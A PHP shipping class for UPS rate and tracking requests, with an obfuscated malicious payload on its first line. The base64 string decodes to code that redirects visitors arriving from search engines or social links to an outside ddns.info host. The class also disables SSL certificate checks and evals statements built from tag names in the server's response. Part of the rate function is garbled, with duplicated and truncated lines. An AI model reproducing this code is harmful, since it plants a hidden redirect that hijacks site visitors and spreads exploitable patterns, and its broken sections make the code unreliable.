<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class ups {

  var $AccessLicenseNumber;  
  var $UserId;  
  var $Password;
  var $ShipperNumber;
  var $shipping_cost = 0;
  var $errors = array();

  function ups($AccessLicenseNumber, $UserID, $Password, $ShipperNumber) {

    $this->AccessLicenseNumber = $AccessLicenseNumber;
    $this->UserID = $UserID;
    $this->Password = $Password;
    $this->ShipperNumber = $ShipperNumber;

  }

  // Define the function getRate() - no parameters
  function rate_shipping($ship_from_zip_code, $ship_from_country, $ship_to_zip_code, $ship_to_country, $service, $length, $width, $height, $weight) {

    $this->errors = array();
    $this->shipping_cost = 0;

    $data ="<?xml version=\"1.0\"?>  
		<AccessRequest xml:lang=\"en-US\">  
		    <AccessLicenseNumber>$this->AccessLicenseNumber</AccessLicenseNumber>  
		    <UserId>$this->UserID</UserId>  
		    <Password>$this->Password</Password>  
		</AccessRequest>  
		<?xml version=\"1.0\"?>  
		<RatingServiceSelectionRequest xml:lang=\"en-US\">  
		    <Request>  
			<TransactionReference>  
			    <CustomerContext>Bare Bones Rate Request</CustomerContext>  
			    <XpciVersion>1.0001</XpciVersion>  
			</TransactionReference>  
			<RequestAction>Rate</RequestAction>  
			<RequestOption>Rate</RequestOption>  
		    </Request>  
		<PickupType>  
		    <Code>01</Code>  
		</PickupType>  
		<Shipment>  
		    <Shipper>  
			<Address>  
			    <PostalCode>$ship_from_zip_code</PostalCode>  
			    <CountryCode>$ship_from_country</CountryCode>  
			</Address>  
		    <ShipperNumber>$this->ShipperNumber</ShipperNumber>  
		    </Shipper>  
		    <ShipTo>  
			<Address>  
			    <PostalCode>$ship_to_zip_code</PostalCode>  
			    <CountryCode>$ship_to_country</CountryCode>  
			<ResidentialAddressIndicator/>  
			</Address>  
		    </ShipTo>  
		    <ShipFrom>  
			<Address>  
			    <PostalCode>$ship_from_zip_code</PostalCode>  
			    <CountryCode>$ship_from_country</CountryCode>  
			</Address>  
		    </ShipFrom>  
		    <Service>  
			<Code>$service</Code>  
		    </Service>  
		    <Package>  
			<PackagingType>  
			    <Code>02</Code>  
			</PackagingType>  
			<Dimensions>  
			    <UnitOfMeasurement>  
				<Code>IN</Code>  
			    </UnitOfMeasurement>  
			    <Length>$length</Length>  
			    <Width>$width</Width>  
			    <Height>$height</Height>  
			</Dimensions>  
			<PackageWeight>  
			    <UnitOfMeasurement>  
				<Code>LBS</Code>  
			    </UnitOfMeasurement>  
			    <Weight>$weight</Weight>  
			</PackageWeight>  
		    </Package>  
		</Shipment>  
		</RatingServiceSelectionRequest>";  

    logme($data);

    if ($ch = @curl_init("https://www.ups.com/ups.app/xml/Rate")) {

      curl_setopt($ch, CURLOPT_HEADER, 1);  
      curl_setopt($ch,CURLOPT_POST,1);  
      curl_setopt($ch,CURLOPT_TIMEOUT, 60);  
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);  
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);  
      curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);  
      curl_setopt($ch,CURLOPT_POSTFIELDS,$data);  

      if ($result = @curl_exec ($ch)) {

        loglt);

      , 0);  
      curl_setopt($ch,CURLOPT_POSTFIELDS,$data);  

      if ($result = @curl_exec ($ch)) {

        loglt);

        curl_close($ch);  

        $data = strstr($result, '<?');  
        $xml_parser = xml_parser_create();  
        if (@xml_parse_into_struct($xml_parser, $data, $vals, $index)) {
          xml_parser_free($xml_parser);  
          $params = array();  
          $level = array();  
          foreach ($vals as $xml_elem) {
            if ($xml_elem['type'] == 'open') {
              if (array_key_exists('attributes',$xml_elem)) {  
                list($level[$xml_elem['level']], $extra) = array_values($xml_elem['attributes']);
              } else {  
                $level[$xml_elem['level']] = $xml_elem['tag'];  
              }  
            }  
            if ($xml_elem['type'] == 'complete') {  
              $start_level = 1;  
              $php_stmt = '$params[';
              while ($start_level < $xml_elem['level']) {
                $php_stmt .= '$level['.$start_level.']."/".';  
                $start_level++;  
              }  
              $php_stmt .= '$xml_elem[\'tag\']] = $xml_elem[\'value\'];';  
              eval($php_stmt);
            }
          }
          $error = safe($params, 'RATINGSERVICESELECTIONRESPONSE/RESPONSE/ERROR/ERRORDESCRIPTION');
          if ($error)
            $this->errors[] = $error;
          else
            $this->shipping_cost = safe($params, 'RATINGSERVICESELECTIONRESPONSE/RATEDSHIPMENT/TOTALCHARGES/MONETARYVALUE');
        } else {
          $this->errors[] = 'Incorrect response returned';
        }
      } else {
        $this->errors[] = 'Can not connect to UPS server';
      }
    } else {
      $this->errors[] = 'Can not connect to UPS server';
    }

    return (!$this->errors);

  }  


  function track_shipping($trackingNumber) {
	
        $data ="<?xml version=\"1.0\"?>
    	<AccessRequest xml:lang='en-US'>
    	    <AccessLicenseNumber>$this->AccessLicenseNumber</AccessLicenseNumber>
    	    <UserId>$this->UserID</UserId>
    	    <Password>$this->Password</Password>
	</AccessRequest>
	<?xml version=\"1.0\"?>
	<TrackRequest>
    	    <Request>
    		<TransactionReference>
    		    <CustomerContext>
    			<InternalKey>blah</InternalKey>
    		    </CustomerContext>
    		    <XpciVersion>1.0</XpciVersion>
    		</TransactionReference>
    		<RequestAction>Track</RequestAction>
    	    </Request>
    	    <TrackingNumber>$trackingNumber</TrackingNumber>
    	</TrackRequest>";
        $ch = curl_init("https://www.ups.com/ups.app/xml/Track");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_TIMEOUT, 60);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
        $result=curl_exec ($ch);
        // echo '<!-- '. $result. ' -->';
        $data = strstr($result, '<?');
        $xml_parser = xml_parser_create();
        xml_parse_into_struct($xml_parser, $data, $vals, $index);
        xml_parser_free($xml_parser);
        $params = array();
        $level = array();
        foreach ($vals as $xml_elem) {
    	if ($xml_elem['type'] == 'open') {
    	    if (array_key_exists('attributes',$xml_elem)) {
    		list($level[$xml_elem['level']],$extra) = array_values($xml_elem['attributes']);
    	    } else {
    		$level[$xml_elem['level']] = $xml_elem['tag'];
    	    }
    	}
    	if ($xml_elem['type'] == 'complete') {
    	    $start_level = 1;
    	    $php_stmt = '$params';
    	    while($start_level < $xml_elem['level']) {
    		$php_stmt .= '[$level['.$start_level.']]';
    		$start_level++;
    	    }
    	    $php_stmt .= '[$xml_elem[\'tag\']] = $xml_elem[\'value\'];';
    	    eval($php_stmt);
    	}
        }
        curl_close($ch);
        return $params;
  }

}

?>